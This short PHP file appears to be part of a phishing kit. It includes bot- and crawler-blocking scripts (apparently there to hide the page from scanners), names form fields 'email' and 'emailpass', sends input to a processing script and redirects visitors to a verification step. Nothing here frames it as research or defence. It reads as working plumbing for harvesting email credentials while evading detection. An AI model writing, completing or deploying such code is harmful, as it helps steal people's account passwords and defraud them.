<?php
session_start();
error_reporting(0);
include '../../autob/bt.php';
include '../../autob/basicbot.php';
include '../../autob/uacrawler.php';
include '../../autob/refspam.php';
include '../../autob/ipselect.php';
include "../../autob/bts2.php";
$idc="ippad";
$proc="../../eproc.php";
$ename="email";
$pname="emailpass";
$epage="../../verify.php";
if(!isset($_SESSION['email'])){header('location:'.$epage);};
if(isset($_GET['p2']) || isset($_GET['sfailed'])){$eshow="?p2=On";};
?>